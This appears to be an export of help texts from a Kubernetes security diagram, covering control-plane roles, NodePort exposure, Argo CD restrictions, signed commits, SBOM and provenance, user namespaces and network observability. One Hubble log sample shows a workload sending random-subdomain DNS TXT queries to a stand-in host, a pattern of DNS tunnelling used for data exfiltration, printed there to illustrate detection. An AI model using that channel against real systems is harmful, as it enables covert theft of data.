g.content:
<UserObject label="<font style="color: rgb(51, 51, 51);"><b>?</b></font>" help="The kube-controller-manager runs the core controllers responsible for continuously reconciling the desired state stored in Kubernetes with the observed state of the cluster.

It contains multiple independent control loops, including controllers for Nodes, ReplicaSets, Deployments, Jobs, Namespaces, ServiceAccounts, and many other Kubernetes resources.

Controllers continuously list and watch resources through the Kubernetes API.

When the observed state differs from the desired state, they create, update, or delete resources through the API to move the cluster toward the desired state. They do not communicate directly with the scheduler, kubelet, or etcd.

The controller-manager operates using its own authenticated identity and requires broad cluster-wide API permissions because its controllers manage many different resource types.

From a security perspective, the controller-manager is one of the most privileged control-plane components. Compromise of its identity or credentials can provide extensive control over cluster resources, making protection of its credentials, configuration, and host particularly important." tags="level-2 info ControlPlane ControlPlane.ControllerManager _ _.Area _.Area.Cluster" slug="ControllerManager"/>
g.data-help:
The kube-controller-manager runs the core controllers responsible for continuously reconciling the desired state stored in Kubernetes with the observed state of the cluster.
It contains multiple independent control loops, including controllers for Nodes, ReplicaSets, Deployments, Jobs, Namespaces, ServiceAccounts, and many other Kubernetes resources.
Controllers continuously list and watch resources through the Kubernetes API.
When the observed state differs from the desired state, they create, update, or delete resources through the API to move the cluster toward the desired state. They do not communicate directly with the scheduler, kubelet, or etcd.
The controller-manager operates using its own authenticated identity and requires broad cluster-wide API permissions because its controllers manage many different resource types.
From a security perspective, the controller-manager is one of the most privileged control-plane components. Compromise of its identity or credentials can provide extensive control over cluster resources, making protection of its credentials, configuration, and host particularly important.

g.content:
<UserObject label="<font style="color: rgb(51, 51, 51);"><b>?</b></font>" help="Kube-Scheduler

The kube-scheduler is responsible for selecting which node should run each newly created Pod that has not yet been assigned to a node.

It continuously watches the Kubernetes API for unscheduled Pods and maintains information about Nodes and other resources required to make scheduling decisions. It considers available resources, scheduling constraints, affinity, taints and tolerations, topology, and other scheduling policies.

Once a node has been selected, the scheduler records the decision through the Kubernetes API. It does not communicate directly with the kubelet or etcd.

The scheduler operates using its own authenticated identity and requires cluster-wide read access to several resources, while its write permissions are primarily related to scheduling Pods. Its API access is controlled through Kubernetes authorization, typically RBAC.

From a security perspective, the scheduler is highly trusted because it can influence where workloads execute. However, its API privileges are generally more limited than those of the kube-controller-manager." tags="level-2 info ControlPlane ControlPlane.Scheduler _ _.Area _.Area.Cluster" slug="Scheduler"/>
g.data-help:
Kube-Scheduler
The kube-scheduler is responsible for selecting which node should run each newly created Pod that has not yet been assigned to a node.
It continuously watches the Kubernetes API for unscheduled Pods and maintains information about Nodes and other resources required to make scheduling decisions. It considers available resources, scheduling constraints, affinity, taints and tolerations, topology, and other scheduling policies.
Once a node has been selected, the scheduler records the decision through the Kubernetes API. It does not communicate directly with the kubelet or etcd.
The scheduler operates using its own authenticated identity and requires cluster-wide read access to several resources, while its write permissions are primarily related to scheduling Pods. Its API access is controlled through Kubernetes authorization, typically RBAC.
From a security perspective, the scheduler is highly trusted because it can influence where workloads execute. However, its API privileges are generally more limited than those of the kube-controller-manager.

g.content:
<UserObject label="<font style="font-size: 18px; color: rgb(51, 51, 51);"><b style="">?</b></font>" help="Kubernetes Resources

Kubernetes resources are API objects that describe the desired or observed state of the cluster. Examples include Pods, Deployments, Services, Secrets, Nodes, Roles, and NetworkPolicies.

Resources can be created by users and applications through the Kubernetes API, or automatically by controllers and other Kubernetes components. Controllers continuously watch resources and may create, modify, or delete other resources to reconcile the cluster toward its desired state.

Namespaced resources belong to a specific namespace and are commonly used for workloads and their configuration. Examples include Pods, Deployments, Services, Secrets, ConfigMaps, and Roles.

Cluster-scoped resources exist across the entire cluster and do not belong to a namespace. Examples include Nodes, Namespaces, ClusterRoles, StorageClasses, and PersistentVolumes.

All resources are accessed and managed through the Kubernetes API, where authentication, authorization, admission control, and other security controls determine who can perform operations on them." tags="info legend" slug="K8sResources"/>
g.data-help:
Kubernetes Resources
Kubernetes resources are API objects that describe the desired or observed state of the cluster. Examples include Pods, Deployments, Services, Secrets, Nodes, Roles, and NetworkPolicies.
Resources can be created by users and applications through the Kubernetes API, or automatically by controllers and other Kubernetes components. Controllers continuously watch resources and may create, modify, or delete other resources to reconcile the cluster toward its desired state.
Namespaced resources belong to a specific namespace and are commonly used for workloads and their configuration. Examples include Pods, Deployments, Services, Secrets, ConfigMaps, and Roles.
Cluster-scoped resources exist across the entire cluster and do not belong to a namespace. Examples include Nodes, Namespaces, ClusterRoles, StorageClasses, and PersistentVolumes.
All resources are accessed and managed through the Kubernetes API, where authentication, authorization, admission control, and other security controls determine who can perform operations on them.

g.content:
<UserObject label="" help="Cloud-Native Application Protection Platform (CNAPP)

A CNAPP provides centralized security visibility and protection across Kubernetes, containers, cloud infrastructure, and workloads.

It typically combines vulnerability and image scanning, security posture management, identity and permission analysis, compliance monitoring, and runtime threat detection.

A CNAPP helps identify and prioritize risks across multiple security layers instead of evaluating vulnerabilities and misconfigurations in isolation.

Examples:
Wiz, Sysdig, Prisma Cloud, and Aqua Security.

Open-source building blocks:
Kubescape, Trivy, Falco and NeuVector, some of them for just scanning images for vulnerabilities in a remote repository." tags="level-1 pri-2 Cnapp" slug="Cnapp"/>
g.data-help:
Cloud-Native Application Protection Platform (CNAPP)
A CNAPP provides centralized security visibility and protection across Kubernetes, containers, cloud infrastructure, and workloads.
It typically combines vulnerability and image scanning, security posture management, identity and permission analysis, compliance monitoring, and runtime threat detection.
A CNAPP helps identify and prioritize risks across multiple security layers instead of evaluating vulnerabilities and misconfigurations in isolation.
Examples: Wiz, Sysdig, Prisma Cloud, and Aqua Security.
Open-source building blocks: Kubescape, Trivy, Falco and NeuVector, some of them for just scanning images for vulnerabilities in a remote repository.

<UserObject label="<font style="color: rgb(51, 51, 51);"><b>?</b></font>" help="NodePort

A NodePort exposes a Service on a static port on every Kubernetes node.

Traffic sent to <NodeIP>:<NodePort> is forwarded by the Kubernetes networking implementation to one of the Service's backend Pods.

NodePort provides basic external reachability, but does not itself provision an external load balancer or public IP." tags="level-3 info Network Network.Ingress Ingress Ingress.Controller _ _.Area _.Area.Cluster" slug="NodePort"/>
g.data-help:
NodePort
A NodePort exposes a Service on a static port on every Kubernetes node.
Traffic sent to <NodeIP>:<NodePort> is forwarded by the Kubernetes networking implementation to one of the Service's backend Pods.
NodePort provides basic external reachability, but does not itself provision an external load balancer or public IP.

g.content:
<UserObject label="<font style="color: rgb(51, 51, 51);"><b>?</b></font>" help="LoadBalancer

A LoadBalancer Service requests an external load balancer from an integrated cloud provider or load-balancer implementation such as MetalLB.

The load balancer receives an external IP and forwards traffic into the Kubernetes Service, which then distributes traffic to its backend Pods.

A LoadBalancer Service typically builds on the same Service mechanisms as NodePort, although implementations may route traffic differently and can bypass NodePort." tags="level-3 info Network Network.Ingress Ingress Ingress.GatewayApi Ingress.GatewayApi.Gateway _ _.Area _.Area.Cluster" slug="LoadBalancer" help.yaml.fixed_loadbalancer_ip="# Asks MetalLB for a fixed IP; externalTrafficPolicy Local keeps the client source IP
apiVersion: v1
kind: Service
metadata:
 name: ingress-nginx-controller
 namespace: ingress-nginx
 annotations:
 metallb.io/loadBalancerIPs: 10.20.8.20
spec:
 type: LoadBalancer
 externalTrafficPolicy: Local
 selector:
 app.kubernetes.io/name: ingress-nginx
 ports:
 - name: https
 port: 443
 targetPort: https"/>
g.data-help:
LoadBalancer
A LoadBalancer Service requests an external load balancer from an integrated cloud provider or load-balancer implementation such as MetalLB.
The load balancer receives an external IP and forwards traffic into the Kubernetes Service, which then distributes traffic to its backend Pods.
A LoadBalancer Service typically builds on the same Service mechanisms as NodePort, although implementations may route traffic differently and can bypass NodePort.

g.content:
<UserObject label="<font style="color: rgb(51, 51, 51);"><b>?</b></font>" help="NodePort Exposure

By default, Kubernetes reserves ports 30000-32767 for NodePort Services.
A NodePort is normally exposed on eligible network interfaces of every node, meaning <NodeIP>:<NodePort> can provide an entry point to the Service.

The port range can be changed using the kube-apiserver option:
--service-node-port-range=30000-32767

Which node addresses accept NodePort traffic can be restricted using the kube-proxy --nodeport-addresses option. This allows NodePort to bind only to selected node networks, for example an internal network.

Network firewalls should additionally restrict access to the NodePort range from untrusted networks.

Note: CNI implementations such as Cilium may implement NodePort without kube-proxy and provide their own configuration for controlling exposure." tags="level-3 info Network Network.Ingress Ingress Ingress.Controller" slug="NodePortExposure" help.shell.list_nodeport_services="# Every NodePort Service opens its port on all nodes; list them
$ kubectl get svc -A --field-selector spec.type=NodePort
NAMESPACE NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE
shop storefront-debug NodePort 10.96.30.64 <none> 8080:30880/TCP 3d"/>
g.data-help:
NodePort Exposure
By default, Kubernetes reserves ports 30000-32767 for NodePort Services. A NodePort is normally exposed on eligible network interfaces of every node, meaning <NodeIP>:<NodePort> can provide an entry point to the Service.
The port range can be changed using the kube-apiserver option: --service-node-port-range=30000-32767
Which node addresses accept NodePort traffic can be restricted using the kube-proxy --nodeport-addresses option. This allows NodePort to bind only to selected node networks, for example an internal network.
Network firewalls should additionally restrict access to the NodePort range from untrusted networks.
Note: CNI implementations such as Cilium may implement NodePort without kube-proxy and provide their own configuration for controlling exposure.
g.data-tags: level-3 info Network Network.Ingress Ingress Ingress.Controller
g.data-help.shell.list_nodeport_services: # Every NodePort Service opens its port on all nodes; list them $ kubectl get svc -A --field-selector spec.type=NodePort NAMESPACE NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE shop storefront-debug NodePort 10.96.30.64 <none> 8080:30880/TCP 3d

g.content:
<UserObject label="<font style="color: rgb(51, 51, 51);"><b>?</b></font>" help="Load Balancer in Front of NodePort

A load balancer provides a controlled external entry point and forwards traffic to the NodePort on selected Kubernetes nodes.

It provides a stable IP or hostname, distributes traffic between healthy nodes, and prevents clients from needing direct access to individual nodes.

Firewall rules should restrict NodePort access so that only the load balancer can reach the exposed ports." tags="level-3 info Network Network.Ingress Ingress Ingress.Controller" slug="NodePortLb"/>
g.data-help:
Load Balancer in Front of NodePort
A load balancer provides a controlled external entry point and forwards traffic to the NodePort on selected Kubernetes nodes.
It provides a stable IP or hostname, distributes traffic between healthy nodes, and prevents clients from needing direct access to individual nodes.
Firewall rules should restrict NodePort access so that only the load balancer can reach the exposed ports.
g.data-tags: level-3 info Network Network.Ingress Ingress Ingress.Controller

g.content:
<UserObject label="" help="Signed Git Commits

Git commits should be signed using a hardware security key (e.g., YubiKey) to ensure authenticity. ArgoCD can be configured to verify commit signatures before deployment." tags="level-2 pri-2 SupplyChain SupplyChain.Git SupplyChain.Gitops SupplyChain.Signing _ _.Area _.Area.PlatformManagement" slug="GitSigning" help.shell.verify_signed_commits="# %G?: G = good signature, N = no signature
$ git log --show-signature -1 v2.8.1
commit efd5ba101a47b45c2d1772da89f367b41b55f56b
gpg: Signature made Wed Oct 7 09:02:11 2026 UTC
gpg: using EDDSA key BD048F171C12A1F8F460AD7CD8ECCBB5C57BB3A7
gpg: Good signature from "Marte Dahl <mdahl@fjordmart.example>" [ultimate]
Author: Marte Dahl <mdahl@fjordmart.example>
Date: 2026-10-07 09:02:11 +0000

 storefront: bump to 2.8.1
$ git log --format='%h %G? %GK %an %s' -2
7396c67 N Jonas Berg unsigned change
efd5ba1 G D8ECCBB5C57BB3A7 Marte Dahl storefront: bump to 2.8.1" help.yaml.require_signed_commits="# Argo CD only syncs shop/deploy when every commit is signed by one of these GPG keys
apiVersion: argoproj.io/v1alpha1
kind: AppProject
metadata:
 name: shop
 namespace: argocd
spec:
 sourceIntegrity:
 git:
 policies:
 - repos:
 - url: https://git.fjordmart.example/shop/deploy.git
 gpg:
 mode: strict
 keys:
 - D8ECCBB5C57BB3A7"/>
g.data-help:
Signed Git Commits
Git commits should be signed using a hardware security key (e.g., YubiKey) to ensure authenticity. ArgoCD can be configured to verify commit signatures before deployment.

storefront: bump to 2.8.1 $ git log --format='%h %G? %GK %an %s' -2 7396c67 N Jonas Berg unsigned change efd5ba1 G D8ECCBB5C57BB3A7 Marte Dahl storefront: bump to 2.8.1

The git-forge (example gitlab, forgejo, ..), that the service-owner/developer uses can be hosted inside the same cluster. A good pattern is to keep this separate from the platform-git.

g.content:
<UserObject label="" help="Argocd (service owner)

To keep the argocd that deals with platform and infrastructure separate from application is good practice. The argocd that deploy the developer applications shoulnt have access to the service-accounts that handles cluster-wide and important resources." tags="level-2 pri-2 SupplyChain SupplyChain.Gitops _ _.Area _.Area.Cluster" slug="ArgocdOwner" help.yaml.restrict_team_project="# Team project: only its repo, only namespace shop, no cluster resources, no RBAC/quota/netpol
apiVersion: argoproj.io/v1alpha1
kind: AppProject
metadata:
 name: shop
 namespace: argocd
spec:
 sourceRepos:
 - https://git.fjordmart.example/shop/deploy.git
 destinations:
 - server: https://kubernetes.default.svc
 namespace: shop
 clusterResourceWhitelist: []
 namespaceResourceBlacklist:
 - group: rbac.authorization.k8s.io
 kind: Role
 - group: rbac.authorization.k8s.io
 kind: RoleBinding
 - group: ""
 kind: ResourceQuota
 - group: ""
 kind: LimitRange
 - group: networking.k8s.io
 kind: NetworkPolicy
---
apiVersion: argoproj.io/v1alpha1
kind: Application
metadata:
 name: shop
 namespace: argocd
spec:
 project: shop
 source:
 repoURL: https://git.fjordmart.example/shop/deploy.git
 targetRevision: main
 path: overlays/k8s-prod
 destination:
 server: https://kubernetes.default.svc
 namespace: shop
 syncPolicy:
 automated:
 prune: true
 selfHeal: true"/>
g.data-help:
Argocd (service owner)
To keep the argocd that deals with platform and infrastructure separate from application is good practice. The argocd that deploy the developer applications shoulnt have access to the service-accounts that handles cluster-wide and important resources.
g.data-help.yaml.restrict_team_project: # Team project: only its repo, only namespace shop, no cluster resources, no RBAC/quota/netpol apiVersion: argoproj.io/v1alpha1 kind: AppProject metadata: name: shop namespace: argocd spec: sourceRepos: - https://git.fjordmart.example/shop/deploy.git destinations: - server: https://kubernetes.default.svc namespace: shop clusterResourceWhitelist: [] namespaceResourceBlacklist: - group: rbac.authorization.k8s.io kind: Role - group: rbac.authorization.k8s.io kind: RoleBinding - group: "" kind: ResourceQuota - group: "" kind: LimitRange - group: networking.k8s.io kind: NetworkPolicy --- apiVersion: argoproj.io/v1alpha1 kind: Application metadata: name: shop namespace: argocd spec: project: shop source: repoURL: https://git.fjordmart.example/shop/deploy.git targetRevision: main path: overlays/k8s-prod destination: server: https://kubernetes.default.svc namespace: shop syncPolicy: automated: prune: true selfHeal: true

g.content:
<UserObject label="" help="Git operator 2

For git operations that can have big impact, there should be "4-eyes" before the change is live.
This can be done with protected branches, but also signing of the git-repo itself using tools like gittuf." tags="level-3 pri-3 SupplyChain SupplyChain.Git SupplyChain.Gitops _ _.Area _.Area.PlatformManagement" slug="FourEyes" help.shell.require_two_signatures_with_gittuf="# gittuf: changes to main need signatures from 2 of 3 people; every clone can verify it, not only the git forge
$ gittuf policy add-person -k keys/policy --person-ID mdahl --public-key keys/mdahl.pub
$ gittuf policy add-person -k keys/policy --person-ID jberg --public-key keys/jberg.pub
$ gittuf policy add-person -k keys/policy --person-ID ihagen --public-key keys/ihagen.pub
$ gittuf policy add-rule -k keys/policy --rule-name protect-main --rule-pattern git:refs/heads/main --authorize mdahl --authorize jberg --authorize ihagen --threshold 2
$ gittuf policy stage --local-only
$ gittuf policy apply --local-only
# main has a new commit signed only by mdahl
$ gittuf verify-ref main
Error: verifying Git namespace policies failed, gittuf policy verification failed" help.json.protect_main_branch="# Forgejo: no direct push to main, 2 approvals, signed commits, also for admins
$ curl -X POST https://git.fjordmart.example/api/v1/repos/shop/deploy/branch_protections -H "Authorization: token $TOKEN" -H 'Content-Type: application/json' -d @-
{
 "rule_name": "main",
 "enable_push": false,
 "required_approvals": 2,
 "dismiss_stale_approvals": true,
 "block_on_rejected_reviews": true,
 "block_on_outdated_branch": true,
 "require_signed_commits": true,
 "apply_to_admins": true
}"/>
g.data-help:
Git operator 2
For git operations that can have big impact, there should be "4-eyes" before the change is live. This can be done with protected branches, but also signing of the git-repo itself using tools like gittuf.
g.data-help.shell.require_two_signatures_w: # gittuf: changes to main need signatures from 2 of 3 people; every clone can verify it, not only the git forge $ gittuf policy add-person -k keys/policy --person-ID mdahl --public-key keys/mdahl.pub $ gittuf policy add-person -k keys/policy --person-ID jberg --public-key keys/jberg.pub $ gittuf policy add-person -k keys/policy --person-ID ihagen --public-key keys/ihagen.pub $ gittuf policy add-rule -k keys/policy --rule-name protect-main --rule-pattern git:refs/heads/main --authorize mdahl --authorize jberg --authorize ihagen --threshold 2 $ gittuf policy stage --local-only $ gittuf policy apply --local-only # main has a new commit signed only by mdahl $ gittuf verify-ref main Error: verifying Git namespace policies failed, gittuf policy verification failed
g.data-help.json.protect_main_branch: # Forgejo: no direct push to main, 2 approvals, signed commits, also for admins $ curl -X POST https://git.fjordmart.example/api/v1/repos/shop/deploy/branch_protections -H "Authorization: token $TOKEN" -H 'Content-Type: application/json' -d @- { "rule_name": "main", "enable_push": false, "required_approvals": 2, "dismiss_stale_approvals": true, "block_on_rejected_reviews": true, "block_on_outdated_branch": true, "require_signed_commits": true, "apply_to_admins": true }

g.content:
<UserObject label="" help="Image Builder

The image builder produces trusted artifacts and must maintain verifiable build provenance.
Each image should be linked to its source commit, build identity, SBOM, and resulting image digest.

Build provenance and attestations should be signed and stored in an append-only transparency log, such as Sigstore Rekor, allowing the origin and integrity of deployed images to be independently verified." tags="level-3 pri-3 SupplyChain SupplyChain.ImageBuild _ _.Area _.Area.Cluster" slug="ImageBuilder" help.containerfile.multi_stage_nonroot_build="# syntax=docker/dockerfile:1
# Build in a Go image, ship only the static binary on distroless, running as UID 65532
FROM registry.fjordmart.example/base/go:1.24 AS build
WORKDIR /src
COPY go.mod go.sum ./
RUN --mount=type=cache,target=/go/pkg/mod go mod download
COPY . .
RUN CGO_ENABLED=0 go build -trimpath -ldflags="-s -w" -o /out/storefront ./cmd/storefront

FROM registry.fjordmart.example/base/distroless-static:nonroot
LABEL org.opencontainers.image.source="https://git.fjordmart.example/shop/storefront"
LABEL org.opencontainers.image.version="2.8.1"
USER 65532:65532
COPY --from=build /out/storefront /usr/local/bin/storefront
EXPOSE 8080
ENTRYPOINT ["/usr/local/bin/storefront"]"/>
g.data-help:
Image Builder
The image builder produces trusted artifacts and must maintain verifiable build provenance. Each image should be linked to its source commit, build identity, SBOM, and resulting image digest.
Build provenance and attestations should be signed and stored in an append-only transparency log, such as Sigstore Rekor, allowing the origin and integrity of deployed images to be independently verified.
g.data-help.containerfile.multi_stage_nonr:
# syntax=docker/dockerfile:1 # Build in a Go image, ship only the static binary on distroless, running as UID 65532 FROM registry.fjordmart.example/base/go:1.24 AS build WORKDIR /src COPY go.mod go.sum ./ RUN --mount=type=cache,target=/go/pkg/mod go mod download COPY . . RUN CGO_ENABLED=0 go build -trimpath -ldflags="-s -w" -o /out/storefront ./cmd/storefront
FROM registry.fjordmart.example/base/distroless-static:nonroot LABEL org.opencontainers.image.source="https://git.fjordmart.example/shop/storefront" LABEL org.opencontainers.image.version="2.8.1" USER 65532:65532 COPY --from=build /out/storefront /usr/local/bin/storefront EXPOSE 8080 ENTRYPOINT ["/usr/local/bin/storefront"]

g.content:
<UserObject label="" help="User Namespace

Linux user namespaces isolate user and group identities between a container and the host.

UIDs and GIDs inside the namespace can be mapped to different IDs outside it. This allows UID 0 (root) inside a container to be mapped to an unprivileged UID on the host.

In Kubernetes, this isolation can be enabled for a pod using hostUsers: false, which automatically assigns and manages the UID/GID mapping.

This provides an additional isolation boundary and limits the privileges of container processes on the host." tags="level-3 pri-1 ProcessSecurity ProcessSecurity.Namespaces _ _.Area _.Area.Cluster _.Area.Deployment _.Area.Pod _.Area.Container _.Area.Process _.Area.OsNamespaces" slug="UserNamespace" help.shell.check_uid_mapping="# hostUsers: false: UID 0 in the container is UID 833617920 on the host
$ kubectl exec -n shop storefront-6c9fd4d8b7-x2n4k -- cat /proc/self/uid_map
 0 833617920 65536
# hostUsers: true (default): container UIDs are host UIDs
$ kubectl exec -n shop cache-warmer -- cat /proc/self/uid_map
 0 0 4294967295"/>
g.data-help:
User Namespace
Linux user namespaces isolate user and group identities between a container and the host.
UIDs and GIDs inside the namespace can be mapped to different IDs outside it. This allows UID 0 (root) inside a container to be mapped to an unprivileged UID on the host.
In Kubernetes, this isolation can be enabled for a pod using hostUsers: false, which automatically assigns and manages the UID/GID mapping.
This provides an additional isolation boundary and limits the privileges of container processes on the host.
g.data-help.shell.check_uid_mapping: # hostUsers: false: UID 0 in the container is UID 833617920 on the host $ kubectl exec -n shop storefront-6c9fd4d8b7-x2n4k -- cat /proc/self/uid_map 0 833617920 65536 # hostUsers: true (default): container UIDs are host UIDs $ kubectl exec -n shop cache-warmer -- cat /proc/self/uid_map 0 0 4294967295

g.content:
<UserObject label="" help="Virtual Machine Resources

The resources visible to the guest are virtual hardware provided by QEMU/KVM and configured through the VirtualMachine specification.

vCPUs are backed by QEMU execution threads scheduled on host CPUs, while virtual memory is backed by memory allocated to the virt-launcher pod. Virtual disks are typically backed by PVCs or DataVolumes, and virtual NICs are connected through the pod's networking or additional network attachments.

KubeVirt translates the VM configuration into the required pod resources, devices and runtime configuration. Kubernetes cgroups and resource limits therefore still control the underlying host resources available to the VM." tags="level-1 pri-3 Workload Workload.Vm _ _.Area _.Area.Cluster _.Area.Deployment _.Area.VirtualMachine _.Area.VmPod _.Area.VmProcess" slug="VmResources"/>
g.data-help:
Virtual Machine Resources
The resources visible to the guest are virtual hardware provided by QEMU/KVM and configured through the VirtualMachine specification.
vCPUs are backed by QEMU execution threads scheduled on host CPUs, while virtual memory is backed by memory allocated to the virt-launcher pod. Virtual disks are typically backed by PVCs or DataVolumes, and virtual NICs are connected through the pod's networking or additional network attachments.
KubeVirt translates the VM configuration into the required pod resources, devices and runtime configuration. Kubernetes cgroups and resource limits therefore still control the underlying host resources available to the VM.

g.content:
<UserObject label="" help="Other cluster nodes

Inter-node traffic may use direct IP-to-IP communication or be encapsulated, depending on the CNI configuration. Encryption can be applied at this level via service mesh (e.g., mTLS) or CNI-level encryption.

Certain workloads—such as ingress controllers, operators, or AI/ML jobs—should be scheduled on dedicated nodes using taints, tolerations, or node selectors to enforce separation and reduce security risk.

There can be many different types of nodes." tags="level-2 pri-3 Node Node.Roles" slug="OtherNodes"/>
g.data-help:
Other cluster nodes
Inter-node traffic may use direct IP-to-IP communication or be encapsulated, depending on the CNI configuration. Encryption can be applied at this level via service mesh (e.g., mTLS) or CNI-level encryption.
Certain workloads—such as ingress controllers, operators, or AI/ML jobs—should be scheduled on dedicated nodes using taints, tolerations, or node selectors to enforce separation and reduce security risk.
There can be many different types of nodes.

g.content:
<UserObject label="" help="SBOM

A Software Bill of Materials (SBOM) provides a machine-readable inventory of the components and dependencies contained in an image.

It enables continuous vulnerability assessment, license tracking, and rapid identification of affected workloads when new vulnerabilities are discovered.

SBOMs should be generated during the build, associated with the image digest, and stored alongside the artifact using standards such as SPDX or CycloneDX." tags="level-3 pri-3 SupplyChain SupplyChain.Sbom _ _.Area _.Area.Cluster" slug="Sbom" help.shell.generate_sbom="# List what is in the image, then attach the SPDX SBOM to it as a signed attestation
$ syft registry:registry.fjordmart.example/shop/storefront:2.8.1 -o spdx-json=storefront.spdx.json
$ syft registry:registry.fjordmart.example/shop/storefront:2.8.1
NAME VERSION TYPE
base-files 12.4+deb12u15 deb
ca-certificates 20250419~deb12u1 deb
media-types 10.0.0 deb
netbase 6.4 deb
stdlib go1.24.13 go-module
tzdata 2026b-0+deb12u1 deb
$ cosign attest --key hashivault://shop-images --type spdxjson --predicate storefront.spdx.json registry.fjordmart.example/shop/storefront@sha256:3c9e1f7a5b2d48e06a1c9f3b7d5e2a084f6c1b9d3e7a5f20c8b4d6e1a9f3c7b2"/>
g.data-help:
SBOM
A Software Bill of Materials (SBOM) provides a machine-readable inventory of the components and dependencies contained in an image.
It enables continuous vulnerability assessment, license tracking, and rapid identification of affected workloads when new vulnerabilities are discovered.
SBOMs should be generated during the build, associated with the image digest, and stored alongside the artifact using standards such as SPDX or CycloneDX.
g.data-help.shell.generate_sbom: # List what is in the image, then attach the SPDX SBOM to it as a signed attestation $ syft registry:registry.fjordmart.example/shop/storefront:2.8.1 -o spdx-json=storefront.spdx.json $ syft registry:registry.fjordmart.example/shop/storefront:2.8.1 NAME VERSION TYPE base-files 12.4+deb12u15 deb ca-certificates 20250419~deb12u1 deb media-types 10.0.0 deb netbase 6.4 deb stdlib go1.24.13 go-module tzdata 2026b-0+deb12u1 deb $ cosign attest --key hashivault://shop-images --type spdxjson --predicate storefront.spdx.json registry.fjordmart.example/shop/storefront@sha256:3c9e1f7a5b2d48e06a1c9f3b7d5e2a084f6c1b9d3e7a5f20c8b4d6e1a9f3c7b2

g.content:
<UserObject label="" help="Provenance / Attestation

Provenance describes where an artifact came from and how it was produced, while attestations provide verifiable claims about the artifact and its build process.

Attestations can link an image digest to its source commit, build system, dependencies, SBOM, and security checks, creating a verifiable chain from source to deployment.

They should be cryptographically signed and verified before deployment, ensuring that only artifacts produced through trusted build processes are allowed to run." tags="level-3 pri-3 SupplyChain SupplyChain.Signing _ _.Area _.Area.Cluster" slug="Provenance" help.json.provenance_attestation="# SLSA build provenance attached to the image, decoded (trimmed)
$ cosign verify-attestation --key hashivault://shop-images --type slsaprovenance1 registry.fjordmart.example/shop/storefront@sha256:3c9e1f7a5b2d48e06a1c9f3b7d5e2a084f6c1b9d3e7a5f20c8b4d6e1a9f3c7b2 | jq -r .payload | base64 -d
{
 "_type": "https://in-toto.io/Statement/v0.1",
 "predicateType": "https://slsa.dev/provenance/v1",
 "subject": [
 {
 "name": "registry.fjordmart.example/shop/storefront",
 "digest": { "sha256": "3c9e1f7a5b2d48e06a1c9f3b7d5e2a084f6c1b9d3e7a5f20c8b4d6e1a9f3c7b2" }
 }
 ],
 "predicate": {
 "buildDefinition": {
 "buildType": "https://git.fjordmart.example/platform/ci/buildtypes/container@v1",
 "externalParameters": {
 "repository": "https://git.fjordmart.example/shop/storefront",
 "ref": "refs/tags/v2.8.1",
 "containerfile": "Containerfile"
 },
 "resolvedDependencies": [
 {
 "uri": "git+https://git.fjordmart.example/shop/storefront@refs/tags/v2.8.1",
 "digest": { "gitCommit": "4e8a1c7f2b9d5e3a6c0f8b1d7e4a2c9f5b3d6e8a" }
 }
 ]
 },
 "runDetails": {
 "builder": { "id": "https://git.fjordmart.example/platform/ci/runners/image-builder" },
 "metadata": {
 "invocationId": "https://git.fjordmart.example/shop/storefront/actions/runs/412",
 "startedOn": "2026-10-07T09:12:03Z",
 "finishedOn": "2026-10-07T09:14:41Z"
 }
 }
 }
}"/>
g.data-help:
Provenance / Attestation
Provenance describes where an artifact came from and how it was produced, while attestations provide verifiable claims about the artifact and its build process.
Attestations can link an image digest to its source commit, build system, dependencies, SBOM, and security checks, creating a verifiable chain from source to deployment.
They should be cryptographically signed and verified before deployment, ensuring that only artifacts produced through trusted build processes are allowed to run.

<UserObject label="" help="Secure CNI (e.g., Cilium)

Use a CNI plugin that supports fine-grained network policies and visibility, such as Cilium with eBPF. Define a baseline deny-all policy and explicitly allow only required traffic.

Default Kubernetes network policies are namespace-scoped and may not cover all scenarios." tags="level-3 pri-2 Node Node.Observability Network Network.Cni Node.Observability.Datapath _ _.Area _.Area.Cluster _.Area.NodeContext" slug="SecureCni" help.log.dropped_flow="# Hubble flow: connection from cache-warmer to payments-proxy dropped by network policy
$ hubble observe --pod shop/cache-warmer --verdict DROPPED
Oct 14 03:44:02.118: shop/cache-warmer:51544 (ID:48211) <> shop/payments-proxy-7f9c6b5d48-q8zrt:443 (ID:31877) Policy denied DROPPED (TCP Flags: SYN)"/>
g.data-help:
Secure CNI (e.g., Cilium)
Use a CNI plugin that supports fine-grained network policies and visibility, such as Cilium with eBPF. Define a baseline deny-all policy and explicitly allow only required traffic.
Default Kubernetes network policies are namespace-scoped and may not cover all scenarios.

g.content:
<UserObject label="" help="Network Observability (e.g., Hubble)

Deploy network observability tooling that can provide workload-aware visibility into network flows, policy verdicts, and DNS activity.

Retain flow telemetry centrally to enable historical correlation between network indicators and Kubernetes workloads during incident investigation.

Network observability complements network policy enforcement but does not replace it." tags="level-3 pri-2 Node Node.Observability Node.Observability.Hubble _ _.Area _.Area.Cluster _.Area.NodeContext" slug="Hubble" help.log.dns_flows="$ hubble observe --protocol dns
Oct 14 03:48:14.309: shop/cache-warmer:47109 (ID:48211) -> kube-system/coredns-5d78c9869d-8hb2l:53 (ID:23714) dns-request proxy FORWARDED (DNS Query traqefpozb5337fb.t.cdnx.example. TXT)
Oct 14 03:48:16.514: shop/cache-warmer:58260 (ID:48211) -> kube-system/coredns-5d78c9869d-8hb2l:53 (ID:23714) dns-request proxy FORWARDED (DNS Query traqefuldbgvatjj.t.cdnx.example. TXT)
Oct 14 03:48:18.722: shop/cache-warmer:39874 (ID:48211) -> kube-system/coredns-5d78c9869d-8hb2l:53 (ID:23714) dns-request proxy FORWARDED (DNS Query traqef6xe7yh3wxh.t.cdnx.example. TXT)"/>
g.data-help:
Network Observability (e.g., Hubble)
Deploy network observability tooling that can provide workload-aware visibility into network flows, policy verdicts, and DNS activity.
Retain flow telemetry centrally to enable historical correlation between network indicators and Kubernetes workloads during incident investigation.
Network observability complements network policy enforcement but does not replace it.

g.content:
<UserObject label="" help="Runtime Security and Observability (e.g., Tetragon, Falco)

Use runtime security tooling to observe process execution, system calls, network connections, and other security-relevant activity inside workloads.

Correlate runtime events with Kubernetes metadata to identify which process, container, and workload caused suspicious activity.

Runtime visibility provides context that network telemetry alone cannot provide." tags="level-3 pri-2 Node Node.RuntimeSecurity _ _.Area _.Area.Cluster _.Area.NodeContext _.Area.RuntimeInstrumentation" slug="RuntimeSecurity"/>
g.data-help:
Runtime Security and Observability (e.g., Tetragon, Falco)
